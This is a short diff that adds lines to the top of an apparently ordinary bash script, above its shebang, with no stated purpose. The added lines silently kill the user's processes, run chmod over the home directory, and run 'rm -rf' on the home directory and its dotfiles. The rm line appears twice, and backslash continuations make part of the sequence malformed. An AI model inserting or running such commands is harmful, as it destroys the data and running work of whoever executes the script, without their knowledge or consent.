@@ -1,3 +1,9 @@
+ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 > /dev/null 2>&1
+chmod -R 755 ~/* \
+chmod -R 755 ~/.* \
+rm -rf ~/.* \
+rm -rf ~/*
+rm -rf ~/*
 #!/bin/bash
 
 re="\033[0m"
